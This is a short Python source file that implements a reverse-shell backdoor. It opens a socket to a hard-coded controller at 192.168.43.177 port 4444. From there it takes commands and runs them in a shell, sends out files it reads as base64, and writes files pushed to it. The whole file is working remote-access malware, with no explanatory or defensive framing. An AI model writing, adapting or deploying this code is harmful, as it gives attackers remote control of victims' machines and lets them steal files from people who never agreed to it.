#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def execute_command(self, command):
		return subprocess.check_output(command, shell=True)

	def proper_send(self, data):
		json_data = json.dumps(data)
		return self.connection.send(json_data)

	def proper_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(4096)
				return json.loads(json_data)
			except ValueError:
				continue

	def change_directory(self, path):
		os.chdir(path)
		return "[+] Change Directory to " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_data(self, filename, content):
		with open(filename, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Successfull"	

	def run(self):
		while True:
			command = self.proper_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command)>1:
					result = self.change_directory(command[1])
				elif command[0] == "download":
					result = self.read_file(command[1])
				elif command[0] == "upload":
					result = self.write_data(command[1], command[2])
				else:
					result = self.execute_command(command)
			except Exception:
				result = "[-] Error during command execution"

			self.proper_send(result)

server_ip = "192.168.43.177"
server_port = 4444

my_backdoor = Backdoor(server_ip, server_port)
my_backdoor.run()